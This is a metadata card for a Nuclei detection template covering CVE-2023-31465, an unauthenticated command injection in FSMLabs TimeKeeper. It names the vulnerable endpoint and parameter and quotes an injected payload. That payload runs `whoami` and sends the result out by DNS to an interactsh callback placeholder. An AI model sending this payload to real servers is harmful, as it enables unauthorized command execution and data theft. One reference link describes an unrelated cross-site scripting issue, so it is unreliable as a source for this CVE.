---
cve_id: CVE-2023-31465
template_path: nuclei-templates/http/cves/2023/CVE-2023-31465.yaml
affected_product: TimeKeeper by FSMLabs
severity: critical
authentication: none
external_callback: true
affected_versions: 8.0.17 through 8.0.28
preconditions: []
poc_classification: rce
---

## Vulnerability
An issue was discovered in FSMLabs TimeKeeper 8.0.17 through 8.0.28. Query parameters passed directly in the URL to the getsamplebacklog endpoint (named arg[x]) allow injection of Bash code into arg[2] that executes directly on the server. Unauthenticated attackers can achieve arbitrary command execution, potentially compromising the entire TimeKeeper time synchronization infrastructure (CVSS 3.1: 9.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

## PoC / Detection
Classification: rce

The template sends a raw GET request to `/getsamplebacklog` with a crafted `arg2` parameter containing a JSON payload that embeds a Bash command injection (`nslookup $(xxd -pu <<< $(whoami)).{{interactsh-url}}` using hardcoded sample values for other args). It confirms exploitation by matching a DNS interaction on interactsh and the presence of `{"seriesID":` in the response body.

## References
- https://github.com/CapgeminiCisRedTeam/Disclosure/blob/main/CVE%20PoC/CVE-ID%20%7C%20RealGimm%20%20-%20Reflected%20Cross-site%20Scripting.md
- https://nvd.nist.gov/vuln/detail/CVE-2023-31465
- https://fsmlabs.com/fsmlabs-cybersecurity/
